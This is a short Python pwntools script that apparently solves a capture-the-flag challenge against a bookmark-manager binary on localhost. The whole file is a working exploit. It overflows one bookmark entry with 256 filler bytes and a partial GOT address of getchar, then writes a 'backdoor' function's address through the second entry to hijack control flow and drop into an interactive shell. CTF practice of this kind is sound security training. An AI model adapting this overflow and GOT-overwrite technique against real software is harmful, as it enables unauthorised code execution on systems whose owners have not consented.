#!/usr/bin/env python2

from pwn import *

r = remote('127.0.0.1', 6987)

# Add bookmark 1
r.recvuntil('Enter your choice: ')
r.sendline('1') 
r.recvuntil('Enter link: ')
r.sendline('www.google.com')

# Add bookmark 2
r.recvuntil('Enter your choice: ')
r.sendline('1')
r.recvuntil('Enter link: ')
r.sendline('www.bing.com')

# Edit bookmark 1
r.recvuntil('Enter your choice: ')
r.sendline('2')
r.recvuntil('Enter bookmark index that you want to edit? ')
r.sendline('1')
r.recvuntil('Enter new link: ')
r.sendline('B'*256 + '\x1c\x10\x02') # 256 filler bytes + GOT address of getchar

# Edit bookmark 2
r.recvuntil('Enter your choice: ')
r.sendline('2')
r.recvuntil('Enter bookmark index that you want to edit? ')
r.sendline('2')
r.recvuntil('Enter new link: ')
r.sendline('\xf8\x06\x01') # Address of backdoor

# Switch to interactive mode
r.interactive()